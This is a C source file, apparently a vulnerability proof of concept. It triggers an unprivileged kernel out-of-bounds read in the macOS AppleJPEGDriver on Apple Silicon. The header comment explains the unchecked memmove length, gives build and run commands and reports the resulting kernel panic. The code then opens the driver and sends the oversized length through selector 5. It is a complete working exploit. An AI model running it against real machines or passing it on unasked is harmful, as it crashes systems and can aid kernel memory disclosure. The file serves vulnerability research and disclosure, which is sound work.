// applejpeg_kernel_oob_poc.c
// Unprivileged -> kernel out-of-bounds read in AppleJPEGDriver (macOS, Apple Silicon).
//
// AppleJPEGDriverUserClient is openable by a normal unprivileged user (uid 501, no
// entitlement). External method selector 5 (startDecoderExt) reads a 32-bit length from
// the caller-supplied structure-input at offset 0x7c and uses it directly as the size of a
// memmove whose source is structure-input+0x84 -- with NO bound check against the dispatched
// structure-input size (0x1000). Any length > 0x1000-0x84 (0xf7c) makes the kernel read past
// the structure-input allocation into adjacent kernel memory; a large length walks off the
// end of mapped memory and causes a Kernel data abort (read fault) -> panic.
//
// Build:  clang -O1 -framework IOKit -framework CoreFoundation -o poc applejpeg_kernel_oob_poc.c
// Run:    ./poc          (triggers the panic on Apple Silicon hardware)
//
// Observed: macOS 26.4.1 (25E253), Mac16,5 / Apple M4 (T6041), AppleJPEGDriver 7.7.9.
//   panic: "Kernel data abort", esr=0x96000007 (read translation fault, unmapped page),
//   faulting memmove in com.apple.driver.AppleJPEGDriver::startDecoderExt.
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

int main(void) {
    // 1) Open the AppleJPEGDriver user client (no privilege / entitlement required).
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                   IOServiceMatching("AppleJPEGDriver"));
    if (!svc) { fprintf(stderr, "AppleJPEGDriver service not found\n"); return 1; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || !conn) { fprintf(stderr, "IOServiceOpen failed: 0x%x\n", kr); return 1; }
    fprintf(stderr, "opened AppleJPEGDriver (uid=%d), conn=0x%x\n", getuid(), conn);

    // 2) Build the structure-input (dispatched size 0x1000 for selector 5).
    uint8_t in[0x1000];
    memset(in, 0, sizeof in);
    *(uint64_t *)(in + 0x30) = 1;            // gate: take the vulnerable copy branch
    *(uint32_t *)(in + 0x2c) = 0;            // normal sampling-mode path
    *(uint32_t *)(in + 0x7c) = 0x10000;      // attacker-controlled copy length (>> 0xf7c bound)

    uint8_t  out[0x1000];
    size_t   outLen = sizeof out;

    // 3) Invoke selector 5 (startDecoderExt). The unchecked memmove reads ~0x10000 bytes from
    //    in+0x84's kernel copy, runs off the end of the kernel allocation, and panics.
    fprintf(stderr, "calling selector 5 with len=0x10000 ...\n");
    kr = IOConnectCallStructMethod(conn, 5, in, sizeof in, out, &outLen);

    // Reached only if the over-read happened to stay within mapped memory at this length.
    fprintf(stderr, "returned 0x%x (no panic at this length; the OOB read still occurred)\n", kr);
    IOServiceClose(conn);
    return 0;
}
